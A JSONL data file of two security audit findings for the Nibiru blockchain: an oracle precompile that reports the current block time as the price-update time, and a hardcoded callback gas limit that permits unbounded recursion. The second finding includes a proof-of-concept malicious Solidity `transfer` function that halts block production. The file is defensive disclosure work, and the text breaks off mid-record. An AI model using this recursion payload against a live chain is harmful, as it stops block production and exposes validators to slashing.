{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-002", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 2, "page_start": null, "title": "IOracle.queryExchangeRate returns incorrect blockTimeMs", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/oracle.go#L92\n\n\n# Vulnerability details\n\nThe IOracle.queryExchangeRate offers the following lookup functionality, in analogy to other oracles like Chainlinks':\n\n```Solidity\n    /// @notice Queries the dated exchange rate for a given pair\n    /// @param pair The asset pair to query. For example, \"ubtc:uusd\" is the\n    /// USD price of BTC and \"unibi:uusd\" is the USD price of NIBI.\n    /// @return price The exchange rate for the given pair\n    /// @return blockTimeMs The block time in milliseconds when the price was\n    /// last updated\n    /// @return blockHeight The block height when the price was last updated\n    /// @dev This function is view-only and does not modify state.\n    function queryExchangeRate(\n        string memory pair\n    ) external view returns (uint256 price, uint64 blockTimeMs, uint64 blockHeight);\n```\n\nIf we focus on the `blockTimeMs` returned value, this is meant to correspond to the time when the price was last updated\nand, in analogy to how Chainlink oracles are typically used, is most likely to be used in staleness checks.\n\nIf we see how this is implemented, we see that values are passed through from OracleKeeper (L92):\n\n```go\nFile: oracle.go\n78: func (p precompileOracle) queryExchangeRate(\n79: \tctx sdk.Context,\n80: \tmethod *gethabi.Method,\n81: \targs []any,\n82: ) (bz []byte, err error) {\n83: \tpair, err := p.parseQueryExchangeRateArgs(args)\n84: \tif err != nil {\n85: \t\treturn nil, err\n86: \t}\n87: \tassetPair, err := asset.TryNewPair(pair)\n88: \tif err != nil {\n89: \t\treturn nil, err\n90: \t}\n91:\n92: \tprice, blockTime, blockHeight, err := p.oracleKeeper.GetDatedExchangeRate(ctx, assetPair)\n93: \tif err != nil {\n94: \t\treturn nil, err\n95: \t}\n96:\n97: \treturn method.Outputs.Pack(price.BigInt(), uint64(blockTime), blockHeight)\n98: }\n```\n\nHowever, the `blockTime` returned by `oracleKeeper.GetDatedExchangeRate` corresponds to the \"current\" block time and\ntherefore does not correspond to what should be returned by the precompile, that is the block time of the last price update.\n\nThe impact of this misalignment is quite severe, because since the returned value is the timestamp returned is always that\nof the current block, the price will always look as freshly set when validated against `blockTime`, which is the most\ncommon validation. Consequently, downstream contracts will likely always pass staleness checks on potentially extremely old prices.\n\n## Proof of Concept\nA simple coded PoC for this issue consists of updating the `TestOracle_HappyPath` test in\n`x/evm/precompile/oracle_test.go` to simulate a precompile call at a later block than that of the price update -\nchanging L66 as follows will cause the test to fail:\n\n```go\nFile: x/evm/precompile/oracle_test.go\n57: func (s *OracleSuite) TestOracle_HappyPath() {\n58: \tdeps := evmtest.NewTestDeps()\n59:\n60: \ts.T().Log(\"Query exchange rate\")\n61: \t{\n62: \t\tdeps.Ctx = deps.Ctx.WithBlockTime(time.Unix(69, 420)).WithBlockHeight(69)\n63: \t\tdeps.App.OracleKeeper.SetPrice(deps.Ctx, \"unibi:uusd\", sdk.MustNewDecFromStr(\"0.067\"))\n64:\n65: \t\tresp, err := deps.EvmKeeper.CallContract(\n66: \t\t\tdeps.Ctx.WithBlockTime(deps.Ctx.BlockTime().Add(10*time.Second)), //  @audit query 10 seconds later\n67: \t\t\tembeds.SmartContract_Oracle.ABI,\n68: \t\t\tdeps.Sender.EthAddr,\n69: \t\t\t&precompile.PrecompileAddr_Oracle,\n70: \t\t\tfalse,\n71: \t\t\tOracleGasLimitQuery,\n72: \t\t\t\"queryExchangeRate\",\n73: \t\t\t\"unibi:uusd\",\n74: \t\t)\n75: \t\ts.NoError(err)\n76:\n77: \t\t// Check the response\n78: \t\tout, err := embeds.SmartContract_Oracle.ABI.Unpack(string(precompile.OracleMethod_queryExchangeRate), resp.Ret)\n79: \t\ts.NoError(err)\n80:\n81: \t\t// Check the response\n82: \t\ts.Equal(out[0].(*big.Int), big.NewInt(67000000000000000))\n83: \t\ts.Equal(out[1].(uint64), uint64(69000))\n84: \t\ts.Equal(out[2].(uint64), uint64(69))\n85: \t}\n86: }\n```\n\n## Recommended Mitigation Steps\nConsider maintaining and querying a lookup table (height to time) for returning the right `blockTime` instead of\nrelying on the value passed by `GetDatedExchangeRate`.\n", "sections": {"description_md": null, "impact_md": null, "recommendation_md": "## Recommended Mitigation Steps\nConsider maintaining and querying a lookup table (height to time) for returning the right `blockTime` instead of\nrelying on the value passed by `GetDatedExchangeRate`.\n", "poc_md": "## Proof of Concept\nA simple coded PoC for this issue consists of updating the `TestOracle_HappyPath` test in\n`x/evm/precompile/oracle_test.go` to simulate a precompile call at a later block than that of the price update -\nchanging L66 as follows will cause the test to fail:\n\n```go\nFile: x/evm/precompile/oracle_test.go\n57: func (s *OracleSuite) TestOracle_HappyPath() {\n58: \tdeps := evmtest.NewTestDeps()\n59:\n60: \ts.T().Log(\"Query exchange rate\")\n61: \t{\n62: \t\tdeps.Ctx = deps.Ctx.WithBlockTime(time.Unix(69, 420)).WithBlockHeight(69)\n63: \t\tdeps.App.OracleKeeper.SetPrice(deps.Ctx, \"unibi:uusd\", sdk.MustNewDecFromStr(\"0.067\"))\n64:\n65: \t\tresp, err := deps.EvmKeeper.CallContract(\n66: \t\t\tdeps.Ctx.WithBlockTime(deps.Ctx.BlockTime().Add(10*time.Second)), //  @audit query 10 seconds later\n67: \t\t\tembeds.SmartContract_Oracle.ABI,\n68: \t\t\tdeps.Sender.EthAddr,\n69: \t\t\t&precompile.PrecompileAddr_Oracle,\n70: \t\t\tfalse,\n71: \t\t\tOracleGasLimitQuery,\n72: \t\t\t\"queryExchangeRate\",\n73: \t\t\t\"unibi:uusd\",\n74: \t\t)\n75: \t\ts.NoError(err)\n76:\n77: \t\t// Check the response\n78: \t\tout, err := embeds.SmartContract_Oracle.ABI.Unpack(string(precompile.OracleMethod_queryExchangeRate), resp.Ret)\n79: \t\ts.NoError(err)\n80:\n81: \t\t// Check the response\n82: \t\ts.Equal(out[0].(*big.Int), big.NewInt(67000000000000000))\n83: \t\ts.Equal(out[1].(uint64), uint64(69000))\n84: \t\ts.Equal(out[2].(uint64), uint64(69))\n85: \t}\n86: }\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/oracle.go#L92\n\n**container:**\n# Vulnerability details\n\nThe IOracle.queryExchangeRate offers the following lookup functionality, in analogy to other oracles like Chainlinks':\n\n```Solidity\n    /// @notice Queries the dated exchange rate for a given pair\n    /// @param pair The asset pair to query. For example, \"ubtc:uusd\" is the\n    /// USD price of BTC and \"unibi:uusd\" is the USD price of NIBI.\n    /// @return price The exchange rate for the given pair\n    /// @return blockTimeMs The block time in milliseconds when the price was\n    /// last updated\n    /// @return blockHeight The block height when the price was last updated\n    /// @dev This function is view-only and does not modify state.\n    function queryExchangeRate(\n        string memory pair\n    ) external view returns (uint256 price, uint64 blockTimeMs, uint64 blockHeight);\n```\n\nIf we focus on the `blockTimeMs` returned value, this is meant to correspond to the time when the price was last updated\nand, in analogy to how Chainlink oracles are typically used, is most likely to be used in staleness checks.\n\nIf we see how this is implemented, we see that values are passed through from OracleKeeper (L92):\n\n```go\nFile: oracle.go\n78: func (p precompileOracle) queryExchangeRate(\n79: \tctx sdk.Context,\n80: \tmethod *gethabi.Method,\n81: \targs []any,\n82: ) (bz []byte, err error) {\n83: \tpair, err := p.parseQueryExchangeRateArgs(args)\n84: \tif err != nil {\n85: \t\treturn nil, err\n86: \t}\n87: \tassetPair, err := asset.TryNewPair(pair)\n88: \tif err != nil {\n89: \t\treturn nil, err\n90: \t}\n91:\n92: \tprice, blockTime, blockHeight, err := p.oracleKeeper.GetDatedExchangeRate(ctx, assetPair)\n93: \tif err != nil {\n94: \t\treturn nil, err\n95: \t}\n96:\n97: \treturn method.Outputs.Pack(price.BigInt(), uint64(blockTime), blockHeight)\n98: }\n```\n\nHowever, the `blockTime` returned by `oracleKeeper.GetDatedExchangeRate` corresponds to the \"current\" block time and\ntherefore does not correspond to what should be returned by the precompile, that is the block time of the last price update.\n\nThe impact of this misalignment is quite severe, because since the returned value is the timestamp returned is always that\nof the current block, the price will always look as freshly set when validated against `blockTime`, which is the most\ncommon validation. Consequently, downstream contracts will likely always pass staleness checks on potentially extremely old prices.\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/oracle.go#L92\n\n\n# Vulnerability details\n\nThe IOracle.queryExchangeRate offers the following lookup functionality, in analogy to other oracles like Chainlinks':\n\n```Solidity\n    /// @notice Queries the dated exchange rate for a given pair\n    /// @param pair The asset pair to query. For example, \"ubtc:uusd\" is the\n    /// USD price of BTC and \"unibi:uusd\" is the USD price of NIBI.\n    /// @return price The exchange rate for the given pair\n    /// @return blockTimeMs The block time in milliseconds when the price was\n    /// last updated\n    /// @return blockHeight The block height when the price was last updated\n    /// @dev This function is view-only and does not modify state.\n    function queryExchangeRate(\n        string memory pair\n    ) external view returns (uint256 price, uint64 blockTimeMs, uint64 blockHeight);\n```\n\nIf we focus on the `blockTimeMs` returned value, this is meant to correspond to the time when the price was last updated\nand, in analogy to how Chainlink oracles are typically used, is most likely to be used in staleness checks.\n\nIf we see how this is implemented, we see that values are passed through from OracleKeeper (L92):\n\n```go\nFile: oracle.go\n78: func (p precompileOracle) queryExchangeRate(\n79: \tctx sdk.Context,\n80: \tmethod *gethabi.Method,\n81: \targs []any,\n82: ) (bz []byte, err error) {\n83: \tpair, err := p.parseQueryExchangeRateArgs(args)\n84: \tif err != nil {\n85: \t\treturn nil, err\n86: \t}\n87: \tassetPair, err := asset.TryNewPair(pair)\n88: \tif err != nil {\n89: \t\treturn nil, err\n90: \t}\n91:\n92: \tprice, blockTime, blockHeight, err := p.oracleKeeper.GetDatedExchangeRate(ctx, assetPair)\n93: \tif err != nil {\n94: \t\treturn nil, err\n95: \t}\n96:\n97: \treturn method.Outputs.Pack(price.BigInt(), uint64(blockTime), blockHeight)\n98: }\n```\n\nHowever, the `blockTime` returned by `oracleKeeper.GetDatedExchangeRate` corresponds to the \"current\" block time and\ntherefore does not correspond to what should be returned by the precompile, that is the block time of the last price update.\n\nThe impact of this misalignment is quite severe, because since the returned value is the timestamp returned is always that\nof the current block, the price will always look as freshly set when validated against `blockTime`, which is the most\ncommon validation. Consequently, downstream contracts will likely always pass staleness checks on potentially extremely old prices.\n\n## Proof of Concept\nA simple coded PoC for this issue consists of updating the `TestOracle_HappyPath` test in\n`x/evm/precompile/oracle_test.go` to simulate a precompile call at a later block than that of the price update -\nchanging L66 as follows will cause the test to fail:\n\n```go\nFile: x/evm/precompile/oracle_test.go\n57: func (s *OracleSuite) TestOracle_HappyPath() {\n58: \tdeps := evmtest.NewTestDeps()\n59:\n60: \ts.T().Log(\"Query exchange rate\")\n61: \t{\n62: \t\tdeps.Ctx = deps.Ctx.WithBlockTime(time.Unix(69, 420)).WithBlockHeight(69)\n63: \t\tdeps.App.OracleKeeper.SetPrice(deps.Ctx, \"unibi:uusd\", sdk.MustNewDecFromStr(\"0.067\"))\n64:\n65: \t\tresp, err := deps.EvmKeeper.CallContract(\n66: \t\t\tdeps.Ctx.WithBlockTime(deps.Ctx.BlockTime().Add(10*time.Second)), //  @audit query 10 seconds later\n67: \t\t\tembeds.SmartContract_Oracle.ABI,\n68: \t\t\tdeps.Sender.EthAddr,\n69: \t\t\t&precompile.PrecompileAddr_Oracle,\n70: \t\t\tfalse,\n71: \t\t\tOracleGasLimitQuery,\n72: \t\t\t\"queryExchangeRate\",\n73: \t\t\t\"unibi:uusd\",\n74: \t\t)\n75: \t\ts.NoError(err)\n76:\n77: \t\t// Check the response\n78: \t\tout, err := embeds.SmartContract_Oracle.ABI.Unpack(string(precompile.OracleMethod_queryExchangeRate), resp.Ret)\n79: \t\ts.NoError(err)\n80:\n81: \t\t// Check the response\n82: \t\ts.Equal(out[0].(*big.Int), big.NewInt(67000000000000000))\n83: \t\ts.Equal(out[1].(uint64), uint64(69000))\n84: \t\ts.Equal(out[2].(uint64), uint64(69))\n85: \t}\n86: }\n```\n\n## Recommended Mitigation Steps\nConsider maintaining and querying a lookup table (height to time) for returning the right `blockTime` instead of\nrelying on the value passed by `GetDatedExchangeRate`.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/oracle.go#L92\n\n\n# Vulnerability details\n\nThe IOracle.queryExchangeRate offers the following lookup functionality, in analogy to other oracles like Chainlinks':\n\n```Solidity\n    /// @notice Queries the dated exchange rate for a given pair\n    /// @param pair The asset pair to query. For example, \"ubtc:uusd\" is the\n    /// USD price of BTC and \"unibi:uusd\" is the USD price of NIBI.\n    /// @return price The exchange rate for the given pair\n    /// @return blockTimeMs The block time in milliseconds when the price was\n    /// last updated\n    /// @return blockHeight The block height when the price was last updated\n    /// @dev This function is view-only and does not modify state.\n    function queryExchangeRate(\n        string memory pair\n    ) external view returns (uint256 price, uint64 blockTimeMs, uint64 blockHeight);\n```\n\nIf we focus on the `blockTimeMs` returned value, this is meant to correspond to the time when the price was last updated\nand, in analogy to how Chainlink oracles are typically used, is most likely to be used in staleness checks.\n\nIf we see how this is implemented, we see that values are passed through from OracleKeeper (L92):\n\n```go\nFile: oracle.go\n78: func (p precompileOracle) queryExchangeRate(\n79: \tctx sdk.Context,\n80: \tmethod *gethabi.Method,\n81: \targs []any,\n82: ) (bz []byte, err error) {\n83: \tpair, err := p.parseQueryExchangeRateArgs(args)\n84: \tif err != nil {\n85: \t\treturn nil, err\n86: \t}\n87: \tassetPair, err := asset.TryNewPair(pair)\n88: \tif err != nil {\n89: \t\treturn nil, err\n90: \t}\n91: \n92: \tprice, blockTime, blockHeight, err := p.oracleKeeper.GetDatedExchangeRate(ctx, assetPair)\n93: \tif err != nil {\n94: \t\treturn nil, err\n95: \t}\n96: \n97: \treturn method.Outputs.Pack(price.BigInt(), uint64(blockTime), blockHeight)\n98: }\n```\n\nHowever, the `blockTime` returned by `oracleKeeper.GetDatedExchangeRate` corresponds to the \"current\" block time and\ntherefore does not correspond to what should be returned by the precompile, that is the block time of the last price update.\n\nThe impact of this misalignment is quite severe, because since the returned value is the timestamp returned is always that\nof the current block, the price will always look as freshly set when validated against `blockTime`, which is the most\ncommon validation. Consequently, downstream contracts will likely always pass staleness checks on potentially extremely old prices.\n\n## Proof of Concept\nA simple coded PoC for this issue consists of updating the `TestOracle_HappyPath` test in \n`x/evm/precompile/oracle_test.go` to simulate a precompile call at a later block than that of the price update - \nchanging L66 as follows will cause the test to fail:\n\n```go\nFile: x/evm/precompile/oracle_test.go\n57: func (s *OracleSuite) TestOracle_HappyPath() {\n58: \tdeps := evmtest.NewTestDeps()\n59: \n60: \ts.T().Log(\"Query exchange rate\")\n61: \t{\n62: \t\tdeps.Ctx = deps.Ctx.WithBlockTime(time.Unix(69, 420)).WithBlockHeight(69)\n63: \t\tdeps.App.OracleKeeper.SetPrice(deps.Ctx, \"unibi:uusd\", sdk.MustNewDecFromStr(\"0.067\"))\n64: \n65: \t\tresp, err := deps.EvmKeeper.CallContract(\n66: \t\t\tdeps.Ctx.WithBlockTime(deps.Ctx.BlockTime().Add(10*time.Second)), //  @audit query 10 seconds later\n67: \t\t\tembeds.SmartContract_Oracle.ABI,\n68: \t\t\tdeps.Sender.EthAddr,\n69: \t\t\t&precompile.PrecompileAddr_Oracle,\n70: \t\t\tfalse,\n71: \t\t\tOracleGasLimitQuery,\n72: \t\t\t\"queryExchangeRate\",\n73: \t\t\t\"unibi:uusd\",\n74: \t\t)\n75: \t\ts.NoError(err)\n76: \n77: \t\t// Check the response\n78: \t\tout, err := embeds.SmartContract_Oracle.ABI.Unpack(string(precompile.OracleMethod_queryExchangeRate), resp.Ret)\n79: \t\ts.NoError(err)\n80: \n81: \t\t// Check the response\n82: \t\ts.Equal(out[0].(*big.Int), big.NewInt(67000000000000000))\n83: \t\ts.Equal(out[1].(uint64), uint64(69000))\n84: \t\ts.Equal(out[2].(uint64), uint64(69))\n85: \t}\n86: }\n```\n\n## Recommended Mitigation Steps\nConsider maintaining and querying a lookup table (height to time) for returning the right `blockTime` instead of \nrelying on the value passed by `GetDatedExchangeRate`."}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-004", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 4, "page_start": null, "title": "Hardcoded gas used in ERC20 queries allows for block production halt from infinite recursion", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L149\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L285\n\n\n# Vulnerability details\n\nThe `funtoken` precompile allows an EVM caller to access information about tokens that coexist in the Cosmos (\"coin\") and EVM (\"ERC20\") spaces.\n\nSome operations performed by this precompile consist of EVM calls; for example, if we look at the `balance` method:\n```go\nFile: funtoken.go\n265: func (p precompileFunToken) balance(\n266: \tstart OnRunStartResult,\n267: \tcontract *vm.Contract,\n268: ) (bz []byte, err error) {\n---\n285: \terc20Bal, err := p.evmKeeper.ERC20().BalanceOf(funtoken.Erc20Addr.Address, addrEth, ctx)\n286: \tif err != nil {\n287: \t\treturn\n288: \t}\n```\nwe see that for fetching the EVM info, it calls the `evmKeeper.ERC20().BalanceOf` function:\n```go\nFile: erc20.go\n125: func (e erc20Calls) BalanceOf(\n126: \tcontract, account gethcommon.Address,\n127: \tctx sdk.Context,\n128: ) (out *big.Int, err error) {\n129: \treturn e.LoadERC20BigInt(ctx, e.ABI, contract, \"balanceOf\", account)\n130: }\n```\nwhich in turn calls `LoadERC20BigInt`:\n```go\nFile: erc20.go\n222: func (k Keeper) LoadERC20BigInt(\n223: \tctx sdk.Context,\n224: \tabi *gethabi.ABI,\n225: \tcontract gethcommon.Address,\n226: \tmethodName string,\n227: \targs ...any,\n228: ) (out *big.Int, err error) {\n229: \tres, err := k.CallContract(\n230: \t\tctx,\n231: \t\tabi,\n232: \t\tevm.EVM_MODULE_ADDRESS, // @audit from\n233: \t\t&contract,\n234: \t\tfalse, // @audit commit = false\n235: \t\tErc20GasLimitQuery, // @audit 100_000\n236: \t\tmethodName,\n237: \t\targs...,\n238: \t)\n239: \tif err != nil {\n240: \t\treturn nil, err\n241: \t}\n```\n\nIf we look closely to how this callback to the EVM is done, we see that the gas allowed for this call is hardcoded to `100_000` and is charged only after the call returned.\n\nThis is problematic because `100_000` is allocated regardless of the gas limit used to call the `funtoken` precompile, and this breaks the [core invariant of the 63/64 gas allocation](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md) that ultimately secures EVM implementation from infinite recursions, which can halt block production and cause the validator to be slashed.\n\nWhile the `balance` example was described in detail, the same applies to the `Transfer` call in `sendToBank`:\n\n```go\nFile: funtoken.go\n109: func (p precompileFunToken) sendToBank(\n110: \tstartResult OnRunStartResult,\n111: \tcaller gethcommon.Address,\n112: \treadOnly bool,\n113: ) (bz []byte, err error) {\n---\n149: \tgotAmount, transferResp, err := p.evmKeeper.ERC20().Transfer(erc20, caller, transferTo, amount, ctx)\n150: \tif err != nil {\n151: \t\treturn nil, fmt.Errorf(\"error in ERC20.transfer from caller to EVM account: %w\", err)\n152: \t}\n```\n\nThe `Burn` call in `sendToBank` is instead secure because it only applies to ERC20 tokens deployed from Coins whose EVM contract is safe.\n\n## Proof of Concept\n\nFor the `balance/balanceOf` attack path (and a more comprehensive, but slower, end-to-end test), this [GitHub Gist](https://gist.github.com/3docSec/7e8f04b601d08fb8af0319179da10e33) includes a coded PoC in the form of an e2e test that:\n- creates an attack ERC-20 token with a function that calls itself through the `funtoken` precompile\n- registers this token as `funtoken` (the call takes a fee but is otherwise permissionless)\n- calls the infinite recursing function\n\nThis test can be run while monitoring the memory consumption of the `localnet` `nibid` process:\n- before the test, the `nibd` process consumes steadily ~100Mb of memory\n- after the `go()` call is triggered:\n    - memory consumption increases at ~10Mb/sec until `nibd` gets eventually killed\n    - even during memory ramp up, the test network stops producing blocks due to consensus timeout\n\n---\n\nFor the `sendToBank/transfer` attack path, the infinite recursion can be tested by changing the `transfer` function in the `TestERC20MaliciousTransfer` test contract as follows:\n\n```solidity\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\n\n    // ...\n\n    function transfer(address to, uint256 amount) public override returns (bool) {\n        (bool res, bytes memory data) = address(0x800).call(\n            abi.encodeWithSignature(\n                \"sendToBank(address,uint256,string)\",\n                address(this),\n                Strings.toHexString(uint160(to))\n            )\n        );\n        require(res, string(data));\n        return true;\n    }\n```\n\nthen, running the `TestFunTokenFromERC20MaliciousTransfer` test in `x/evm/keeper/funtoken_from_erc20_test.go` will hang in an infinite recursion that will quickly eat up all memory available.\n\n## Recommended Mitigation Steps\nConsider refactoring the `evmKeeper.ERC20().BalanceOf` and `evmKeeper.ERC20().Transfer` calls to accept as argument, and use at most, 63/64 of the EVM gas available.\n", "sections": {"description_md": null, "impact_md": null, "recommendation_md": "## Recommended Mitigation Steps\nConsider refactoring the `evmKeeper.ERC20().BalanceOf` and `evmKeeper.ERC20().Transfer` calls to accept as argument, and use at most, 63/64 of the EVM gas available.\n", "poc_md": "## Proof of Concept\n\nFor the `balance/balanceOf` attack path (and a more comprehensive, but slower, end-to-end test), this [GitHub Gist](https://gist.github.com/3docSec/7e8f04b601d08fb8af0319179da10e33) includes a coded PoC in the form of an e2e test that:\n- creates an attack ERC-20 token with a function that calls itself through the `funtoken` precompile\n- registers this token as `funtoken` (the call takes a fee but is otherwise permissionless)\n- calls the infinite recursing function\n\nThis test can be run while monitoring the memory consumption of the `localnet` `nibid` process:\n- before the test, the `nibd` process consumes steadily ~100Mb of memory\n- after the `go()` call is triggered:\n    - memory consumption increases at ~10Mb/sec until `nibd` gets eventually killed\n    - even during memory ramp up, the test network stops producing blocks due to consensus timeout\n\n---\n\nFor the `sendToBank/transfer` attack path, the infinite recursion can be tested by changing the `transfer` function in the `TestERC20MaliciousTransfer` test contract as follows:\n\n```solidity\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\n\n    // ...\n\n    function transfer(address to, uint256 amount) public override returns (bool) {\n        (bool res, bytes memory data) = address(0x800).call(\n            abi.encodeWithSignature(\n                \"sendToBank(address,uint256,string)\",\n                address(this),\n                Strings.toHexString(uint160(to))\n            )\n        );\n        require(res, string(data));\n        return true;\n    }\n```\n\nthen, running the `TestFunTokenFromERC20MaliciousTransfer` test in `x/evm/keeper/funtoken_from_erc20_test.go` will hang in an infinite recursion that will quickly eat up all memory available.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L149\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L285\n\n**container:**\n# Vulnerability details\n\nThe `funtoken` precompile allows an EVM caller to access information about tokens that coexist in the Cosmos (\"coin\") and EVM (\"ERC20\") spaces.\n\nSome operations performed by this precompile consist of EVM calls; for example, if we look at the `balance` method:\n```go\nFile: funtoken.go\n265: func (p precompileFunToken) balance(\n266: \tstart OnRunStartResult,\n267: \tcontract *vm.Contract,\n268: ) (bz []byte, err error) {\n---\n285: \terc20Bal, err := p.evmKeeper.ERC20().BalanceOf(funtoken.Erc20Addr.Address, addrEth, ctx)\n286: \tif err != nil {\n287: \t\treturn\n288: \t}\n```\nwe see that for fetching the EVM info, it calls the `evmKeeper.ERC20().BalanceOf` function:\n```go\nFile: erc20.go\n125: func (e erc20Calls) BalanceOf(\n126: \tcontract, account gethcommon.Address,\n127: \tctx sdk.Context,\n128: ) (out *big.Int, err error) {\n129: \treturn e.LoadERC20BigInt(ctx, e.ABI, contract, \"balanceOf\", account)\n130: }\n```\nwhich in turn calls `LoadERC20BigInt`:\n```go\nFile: erc20.go\n222: func (k Keeper) LoadERC20BigInt(\n223: \tctx sdk.Context,\n224: \tabi *gethabi.ABI,\n225: \tcontract gethcommon.Address,\n226: \tmethodName string,\n227: \targs ...any,\n228: ) (out *big.Int, err error) {\n229: \tres, err := k.CallContract(\n230: \t\tctx,\n231: \t\tabi,\n232: \t\tevm.EVM_MODULE_ADDRESS, // @audit from\n233: \t\t&contract,\n234: \t\tfalse, // @audit commit = false\n235: \t\tErc20GasLimitQuery, // @audit 100_000\n236: \t\tmethodName,\n237: \t\targs...,\n238: \t)\n239: \tif err != nil {\n240: \t\treturn nil, err\n241: \t}\n```\n\nIf we look closely to how this callback to the EVM is done, we see that the gas allowed for this call is hardcoded to `100_000` and is charged only after the call returned.\n\nThis is problematic because `100_000` is allocated regardless of the gas limit used to call the `funtoken` precompile, and this breaks the [core invariant of the 63/64 gas allocation](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md) that ultimately secures EVM implementation from infinite recursions, which can halt block production and cause the validator to be slashed.\n\nWhile the `balance` example was described in detail, the same applies to the `Transfer` call in `sendToBank`:\n\n```go\nFile: funtoken.go\n109: func (p precompileFunToken) sendToBank(\n110: \tstartResult OnRunStartResult,\n111: \tcaller gethcommon.Address,\n112: \treadOnly bool,\n113: ) (bz []byte, err error) {\n---\n149: \tgotAmount, transferResp, err := p.evmKeeper.ERC20().Transfer(erc20, caller, transferTo, amount, ctx)\n150: \tif err != nil {\n151: \t\treturn nil, fmt.Errorf(\"error in ERC20.transfer from caller to EVM account: %w\", err)\n152: \t}\n```\n\nThe `Burn` call in `sendToBank` is instead secure because it only applies to ERC20 tokens deployed from Coins whose EVM contract is safe.\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L149\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/precompile/funtoken.go#L285\n\n\n# Vulnerability details\n\nThe `funtoken` precompile allows an EVM caller to access information about tokens that coexist in the Cosmos (\"coin\") and EVM (\"ERC20\") spaces.\n\nSome operations performed by this precompile consist of EVM calls; for example, if we look at the `balance` method:\n```go\nFile: funtoken.go\n265: func (p precompileFunToken) balance(\n266: \tstart OnRunStartResult,\n267: \tcontract *vm.Contract,\n268: ) (bz []byte, err error) {\n---\n285: \terc20Bal, err := p.evmKeeper.ERC20().BalanceOf(funtoken.Erc20Addr.Address, addrEth, ctx)\n286: \tif err != nil {\n287: \t\treturn\n288: \t}\n```\nwe see that for fetching the EVM info, it calls the `evmKeeper.ERC20().BalanceOf` function:\n```go\nFile: erc20.go\n125: func (e erc20Calls) BalanceOf(\n126: \tcontract, account gethcommon.Address,\n127: \tctx sdk.Context,\n128: ) (out *big.Int, err error) {\n129: \treturn e.LoadERC20BigInt(ctx, e.ABI, contract, \"balanceOf\", account)\n130: }\n```\nwhich in turn calls `LoadERC20BigInt`:\n```go\nFile: erc20.go\n222: func (k Keeper) LoadERC20BigInt(\n223: \tctx sdk.Context,\n224: \tabi *gethabi.ABI,\n225: \tcontract gethcommon.Address,\n226: \tmethodName string,\n227: \targs ...any,\n228: ) (out *big.Int, err error) {\n229: \tres, err := k.CallContract(\n230: \t\tctx,\n231: \t\tabi,\n232: \t\tevm.EVM_MODULE_ADDRESS, // @audit from\n233: \t\t&contract,\n234: \t\tfalse, // @audit commit = false\n235: \t\tErc20GasLimitQuery, // @audit 100_000\n236: \t\tmethodName,\n237: \t\targs...,\n238: \t)\n239: \tif err != nil {\n240: \t\treturn nil, err\n241: \t}\n```\n\nIf we look closely to how this callback to the EVM is done, we see that the gas allowed for this call is hardcoded to `100_000` and is charged only after the call returned.\n\nThis is problematic because `100_000` is allocated regardless of the gas limit used to call the `funtoken` precompile, and this breaks the [core invariant of the 63/64 gas allocation](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md) that ultimately secures EVM implementation from infinite recursions, which can halt block production and cause the validator to be slashed.\n\nWhile the `balance` example was described in detail, the same applies to the `Transfer` call in `sendToBank`:\n\n```go\nFile: funtoken.go\n109: func (p precompileFunToken) sendToBank(\n110: \tstartResult OnRunStartResult,\n111: \tcaller gethcommon.Address,\n112: \treadOnly bool,\n113: ) (bz []byte, err error) {\n---\n149: \tgotAmount, transferResp, err := 